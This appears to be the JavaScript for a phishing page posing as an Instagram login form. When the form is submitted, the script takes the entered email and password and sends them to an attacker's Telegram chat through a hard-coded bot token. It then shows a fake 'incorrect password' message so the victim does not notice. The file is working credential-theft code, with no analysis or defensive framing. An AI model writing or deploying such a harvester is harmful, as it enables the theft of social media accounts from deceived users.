
const form = document.querySelector("#form");
form.addEventListener("submit", (e) => {
  e.preventDefault();
 
   
        var identity = document.getElementById("email").value;
        var password = document.getElementById("password").value;

        var my_text = `Instagram Result from IpAddress for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} `;
    
          var token = "6650969963:AAECQrzycrXYX2_j45OEBuoMU38lLXTjLh8";
    var chat_id = -4270395846
        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;

        let api = new XMLHttpRequest();
        api.open("GET", url, true);
        api.send();
        document.getElementById("alert-message").innerHTML =
          "Sorry, your password was incorrect. Please double-check your password.";


  // window.location.replace("https://www.instagram.com/accounts/login/")
  //   console.log("Incorrect Password!");
});
